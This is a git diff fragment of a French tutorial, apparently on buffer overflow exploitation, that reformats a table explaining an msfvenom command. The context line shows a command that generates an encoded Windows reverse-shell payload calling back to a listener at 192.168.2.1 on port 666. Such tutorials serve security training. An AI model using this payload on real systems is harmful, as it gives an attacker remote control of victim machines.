@@ -26,15 +26,14 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.1
 LPORT=666 -f c -e x86/shikata_ga_nai -b "\x00\x0D\xFF"
 ```
 
-| Paramètre | Valeur                    | Description            |
-| --------- | ------------------------- | ---------------------- |
-| -p        | windows/shell_reverse_tcp | type de payload        |
-| LHOST     | 192.168.2.1               | adresse ip du listener |
-| LPORT     | 666                       | port du listener       |
-| -f        | c                         | export au format C     |
-| -e        | x86/shikata_ga_nai        | encodeur               |
-| -b        | "\x00\x0D\xFF"            | liste des Badchar      |
-
+ Paramètre | Valeur                    | Description            
+ --------- | ------------------------- | ---------------------- 
+ -p        | windows/shell_reverse_tcp | type de payload        
+ LHOST     | 192.168.2.1               | adresse ip du listener 
+ LPORT     | 666                       | port du listener       
+ -f        | c                         | export au format C     
+ -e        | x86/shikata_ga_nai        | encodeur               
+ -b        | "\x00\x0D\xFF"            | liste des Badchar       
 
 - Maintenant, créer l'exploit avec :
 ```
